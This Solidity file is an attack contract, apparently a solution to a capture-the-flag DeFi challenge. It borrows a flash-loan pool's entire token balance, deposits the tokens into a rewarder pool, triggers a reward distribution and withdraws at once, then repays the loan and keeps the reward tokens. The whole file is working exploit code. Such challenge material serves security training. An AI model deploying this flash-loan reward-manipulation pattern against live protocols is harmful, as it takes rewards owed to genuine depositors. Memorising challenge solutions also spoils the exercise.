// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool{
     function flashLoan(uint256 amount) external;
}

interface IRewarderPool{
     function deposit(uint256 amount) external;
     function withdraw(uint256 amount) external;
     function distributeRewards() external returns(uint256);
}

contract AttackTheRewarder {

    IFlashLoanerPool immutable flashLoanPool;
    IRewarderPool immutable rewarderPool;
    IERC20 immutable liquidityToken;
    IERC20 immutable rewardToken;
    address immutable player;

    constructor(address _flashLoanPool, address _rewarderPool, address _player, address _liquidityToken, address _rewardToken) {
        player = _player;
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
        liquidityToken = IERC20(_liquidityToken);
        rewarderPool = IRewarderPool(_rewarderPool);
        rewardToken = IERC20(_rewardToken);
    }

    function attack() external {
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));        
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanPool), "not pool");
        require(tx.origin == player, "not player");

        // Deposit --> Get Rewards --> Withdraw
        uint256 balance = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(rewarderPool), balance);
        rewarderPool.deposit(balance);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(balance);

        // // Pay back flashloan and send rewards to player
        liquidityToken.transfer(address(flashLoanPool), balance);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
